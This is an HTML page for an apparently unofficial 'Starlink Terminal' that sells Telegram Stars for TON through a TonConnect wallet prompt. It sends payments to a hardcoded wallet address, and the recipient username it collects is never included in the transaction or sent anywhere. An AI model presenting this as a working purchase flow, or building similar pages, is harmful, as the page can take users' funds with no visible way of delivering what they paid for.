<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Starlink Terminal</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { background-color: #0e1621; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .card { background: #17212b; padding: 25px; border-radius: 20px; width: 340px; border: 1px solid #242f3d; box-shadow: 0 20px 40px rgba(0,0,0,0.7); text-align: center; }
        h2 { color: #24a1de; font-size: 20px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .input-group { text-align: left; margin-bottom: 18px; }
        label { display: block; color: #818d99; font-size: 11px; margin-bottom: 6px; text-transform: uppercase; }
        input { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid #242f3d; background: #242f3d; color: white; box-sizing: border-box; outline: none; font-weight: bold; font-size: 15px; }
        input:focus { border-color: #24a1de; }
        .price-container { background: rgba(36, 161, 222, 0.05); border-radius: 15px; padding: 20px; margin: 20px 0; border: 1px dashed #24a1de; }
        .price-tag { font-size: 32px; font-weight: bold; color: #ffffff; }
        .price-tag span { font-size: 16px; color: #24a1de; margin-left: 5px; }
        #ton-connect { display: flex; justify-content: center; margin-bottom: 20px; }
        .btn-buy { background: linear-gradient(90deg, #24a1de, #0088cc); color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3); }
        .error-msg { color: #ef5350; font-size: 10px; margin-top: 5px; display: none; }
    </style>
</head>
<body>

    <div class="card" id="mainCard">
        <h2>💎 Starlink Terminal</h2>
        <div id="ton-connect"></div>

        <div class="input-group">
            <label>Recipient ID</label>
            <input type="text" placeholder="@username" id="userInput">
            <div id="userError" class="error-msg">⚠️ Username required</div>
        </div>
        
        <div class="input-group">
            <label>Stars Quantity (Min: 50)</label>
            <input type="number" id="starsInput" value="100" min="50" oninput="calculatePrice()">
            <div id="amountError" class="error-msg">⚠️ Minimum: 50 Stars</div>
        </div>
        
        <div class="price-container">
            <div class="price-tag"><span id="totalPrice">0.86</span> <span>TON</span></div>
            <div style="font-size: 10px; color: #818d99; margin-top: 5px;">Rate: 100 Stars = 0.86 TON</div>
        </div>
        
        <button class="btn-buy" onclick="processOrder()">CONFIRM PURCHASE</button>
    </div>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://acenumber0.github.io/telegram/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });

        function calculatePrice() {
            const stars = document.getElementById('starsInput').value;
            const priceDisplay = document.getElementById('totalPrice');
            // الحسبة: 100 نجمة بـ 0.86 TON، يعني النجمة بـ 0.0086
            const ratePerStar = 0.0086;
            let total = stars * ratePerStar;
            priceDisplay.innerText = total.toFixed(3); // تظهر 3 خانات للدقة
        }

        async function processOrder() {
            const user = document.getElementById('userInput');
            const stars = document.getElementById('starsInput');
            
            if (!user.value.trim() || stars.value < 50) {
                alert("Please check your input (Min 50 stars)");
                return;
            }

            if (!tonConnectUI.connected) {
                alert("Connect wallet first!");
                return;
            }

            const amountInTon = stars.value * 0.0086;
            const nanoAmount = Math.floor(amountInTon * 1000000000).toString();

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 120, 
                messages: [{
                    address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS",
                    amount: nanoAmount 
                }]
            };

            try {
                await tonConnectUI.sendTransaction(transaction);
                alert("Transaction Sent!");
            } catch (e) {
                alert("Failed to send transaction.");
            }
        }
    </script>
</body>
</html>
